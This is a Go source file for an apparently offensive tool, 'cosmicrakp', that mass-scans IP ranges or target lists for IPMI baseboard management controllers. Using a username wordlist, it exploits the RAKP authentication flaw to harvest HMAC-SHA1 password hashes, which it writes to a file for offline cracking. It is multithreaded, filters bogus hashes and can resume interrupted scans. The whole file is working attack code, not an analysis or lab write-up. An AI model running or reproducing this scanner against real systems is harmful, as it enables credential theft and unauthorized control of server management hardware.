package main

import (
	"bufio"
	"cosmicrakp/ipmi"
	"cosmicrakp/util"
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"sync"
	"time"
)

var debugMode bool
var maxAttempts int
var retryDelay time.Duration // Time duration in seconds
var operationMode string
var ipRange string
var targetFile string
var usernamesFile string
var outputFile string
var numThreads int
var pauseFileMutex sync.Mutex

func main() {
	flag.BoolVar(&debugMode, "debug", false, "enable debug mode")
	flag.IntVar(&maxAttempts, "max-attempts", 3, "maximum number of attempts to open a session")
	flag.DurationVar(&retryDelay, "retry-delay", 2*time.Second, "time to wait between retries (in seconds)")
	flag.StringVar(&operationMode, "mode", "range", "mode of operation: 'range' or 'file'")
	flag.StringVar(&ipRange, "range", "", "IP range for 'range' mode")
	flag.StringVar(&targetFile, "targets", "", "target file for 'file' mode")
	flag.StringVar(&usernamesFile, "usernames", "users.txt", "File containing usernames to test")
	flag.StringVar(&outputFile, "output", "output.txt", "File to store output results")
	flag.IntVar(&numThreads, "threads", 4, "number of threads for concurrent execution")
	flag.Parse()

	var usernames []string
	var err error

	ipChannel := make(chan string, numThreads) // Create a channel with buffer size = numThreads
	lineChannel := make(chan string, numThreads)
	pauseFileChannel := make(chan string, numThreads)
	sem := make(chan struct{}, numThreads) // Semaphore to limit concurrent execution
	var wg sync.WaitGroup                  // Declare a WaitGroup
	done := make(chan struct{})

	go writePauseFile(done, pauseFileChannel)

	// Read usernames
	if usernamesFile != "" {
		usernames, err = util.ReadLinesFromFile(usernamesFile)
		if err != nil {
			fmt.Printf("Failed to read usernames from file: %v\n", err)
			return
		}
	}

	// Read the pause file to get a list of targets to skip
	toSkip := readPauseFile()

	switch operationMode {
	case "range":
		if ipRange == "" {
			fmt.Println("IP range must be provided for 'range' mode")
			return
		}
		go util.GenerateIPsFromCIDR(ipRange, ipChannel) // Start IP generator in a goroutine

	case "file":
		if targetFile == "" {
			fmt.Println("Target file must be provided for 'file' mode")
			return
		}
		go func() {
			err = util.StreamLinesFromFile(targetFile, lineChannel)
			if err != nil {
				// Handle error
				fmt.Println("Error reading from file:", err)
			}
		}()

	default:
		fmt.Println("Invalid mode. Use 'range' or 'file'")
		return
	}

	// Main loop to fetch and process targets
	for {
		var targetBuffer []string

		// Fill the buffer up to numThreads
		for i := 0; i < numThreads; i++ {
			var target string
			var ok bool

			if operationMode == "range" {
				target, ok = <-ipChannel
			} else {
				target, ok = <-lineChannel
			}

			if !ok {
				break
			}
			targetBuffer = append(targetBuffer, target)
		}

		// Break if no targets are left
		if len(targetBuffer) == 0 {
			break
		}

		for _, target := range targetBuffer {
			if _, found := toSkip[target]; found {
				fmt.Println("Skipping completed target:", target)
				continue
			}

			if debugMode {
				fmt.Println("Acquiring token for", target)
			}
			sem <- struct{}{}
			if debugMode {
				fmt.Println("Acquired token for", target)
			}

			wg.Add(1) // Increment the WaitGroup counter
			go func(target string) {
				defer wg.Done() // Decrement counter when goroutine completes
				defer func() {
					<-sem
					if debugMode {
						fmt.Println("Released token for", target)
					}
				}()
				processTarget(target, usernames, pauseFileChannel)
			}(target)
		}
	}

	wg.Wait() // Wait for all goroutines to complete

	close(done) // Close the done channel to signal writePauseFile to terminate
}

func processTarget(target string, usernames []string, pauseFileChannel chan string) {
	pauseFileChannel <- target
	for _, username := range usernames {
		conn, err := ipmi.CreateUDPConnection(target)
		if err != nil {
			fmt.Printf("Failed to create UDP connection: %v\n", err)
			return
		}
		defer conn.Close()

		// Generate a console session ID
		consoleSessionID := make([]byte, 4) // assuming 4-byte length
		_, err = rand.Read(consoleSessionID)
		if err != nil {
			fmt.Printf("Failed to generate random console session ID: %v", err)
		}

		// Create a console random ID
		consoleRandomID := make([]byte, 16)
		_, err = rand.Read(consoleRandomID)
		if err != nil {
			fmt.Printf("Failed to generate random console random ID: %v", err)
		}

		// Call the function
		reply, err := ipmi.SendIPMISessionOpenRequest(conn, consoleSessionID, maxAttempts, retryDelay, 5*time.Second)
		if err != nil {
			fmt.Printf("Failed to send IPMI open session request: %v\n", err)
			return
		}

		if debugMode {
			fmt.Printf("Successfully sent IPMI open session request, reply: %+v\n", reply)
		}

		sess_data := &ipmi.SessionData{
			ConsoleSessionID: reply.Data[0:4],
			BMCSessionID:     reply.Data[4:8],
		}

		if debugMode {
			fmt.Printf("Debug bmcSessionID: %x\n", sess_data.BMCSessionID)
			fmt.Printf("Debug consoleSessionID: %x\n", consoleSessionID)
			fmt.Printf("Debug consoleRandomID: %x\n", consoleRandomID)
		}

		rakp2, err := ipmi.SendIPMIRAKP1Request(conn, sess_data.BMCSessionID, consoleRandomID, username, maxAttempts, retryDelay)
		if err != nil {
			if err.Error() == "No hash data" {
				if debugMode {
					fmt.Printf("No hash data for %s and username: %s\n", target, username)
				}
				continue
			} else {
				fmt.Printf("Failed to send IPMI RAKP1 request: %v\n", err)
				continue
			}
		}
		if debugMode {
			fmt.Printf("RAKP2: %+v\n", rakp2)
			fmt.Printf("RAKP2 data length: %d\n", len(rakp2.Data))
		}

		err = ipmi.CheckRAKPErrors(rakp2, username)
		if err != nil {
			if debugMode {
				fmt.Printf("RAKP2 error: %v\n", err)
			}
			continue
		}

		// Extract bmc_random_id and bmc_guid
		bmcRandomID := string(rakp2.Data[4:20])
		bmcGUID := string(rakp2.Data[20:36])
		hmacSHA1 := rakp2.Data[36:56]

		if debugMode {
			fmt.Printf("bmcRandomID: %x\n", bmcRandomID)
			fmt.Printf("bmcGUID: %x\n", bmcGUID)
		}

		sha1Salt := hex.EncodeToString(ipmi.CreateRAKPHMACSHA1Salt(consoleSessionID, sess_data.BMCSessionID, consoleRandomID, bmcRandomID, bmcGUID, uint8(0x14), username))
		sha1Hash := hex.EncodeToString(hmacSHA1)

		err = ipmi.CheckBogusHash(sha1Hash)
		if err != nil {
			fmt.Printf("Bogus hash detected!\n")
			continue
		}

		fmt.Printf("%s %s:%s:%s\n", target, username, sha1Salt, sha1Hash)
		util.LogHash(target, username, sha1Salt, sha1Hash, outputFile)
	}
}

// Read the pause file and return a map of targets to skip
func readPauseFile() map[string]struct{} {
	file, err := os.Open("pause_file.txt")
	if err != nil {
		return nil
	}
	defer file.Close()

	toSkip := make(map[string]struct{})
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		toSkip[scanner.Text()] = struct{}{}
	}

	return toSkip
}

func writePauseFile(done chan struct{}, pauseFileChannel chan string) {
	file, err := os.OpenFile("pause_file.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Failed to open pause file: %v\n", err)
		return
	}
	defer file.Close()

	for {
		select {
		case target := <-pauseFileChannel:
			pauseFileMutex.Lock()
			_, err := file.WriteString(target + "\n")
			if err != nil {
				fmt.Printf("Failed to write to pause file: %v\n", err)
			}
			pauseFileMutex.Unlock()
		case <-done:
			fmt.Println("Stopping pause file writer.")
			return
		}
	}
}
